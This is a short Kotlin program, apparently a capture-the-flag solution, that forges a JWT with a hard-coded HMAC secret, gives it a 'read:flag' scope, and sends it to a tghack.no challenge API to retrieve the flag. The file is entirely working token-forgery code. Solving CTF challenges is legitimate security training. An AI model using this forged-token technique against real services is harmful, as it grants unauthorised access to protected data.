import com.auth0.jwt.JWT
import com.auth0.jwt.algorithms.Algorithm
import okhttp3.OkHttpClient
import okhttp3.Request
import java.time.ZonedDateTime
import java.util.*

fun main(args: Array<String>) {
    val secret = "55CCE41AF215358AE42C75745989BAFE33E48100791DG2F1F8BE3FA5654102AE"
    val issuer = "api.superawesome.tghack.no"
    val url = "http://api.superawesome.tghack.no/api"
    val client = OkHttpClient()

    val algorithm = Algorithm.HMAC256(secret)

    val signedToken = JWT.create()
            .withIssuer(issuer)
            .withExpiresAt(Date.from(ZonedDateTime.now().plusDays(20).toInstant()))
            .withArrayClaim("scope", arrayOf("read:flag"))
            .withSubject("hax0r")
            .withNotBefore(Date())
            .sign(algorithm)

    val request = Request.Builder()
            .url("$url/flag")
            .header("X-Access-Token", signedToken)
            .header("Accept", "application/json")
            .get()
            .build()

    val response = client.newCall(request).execute()

    println(response.body()?.string()?: "No body received")
}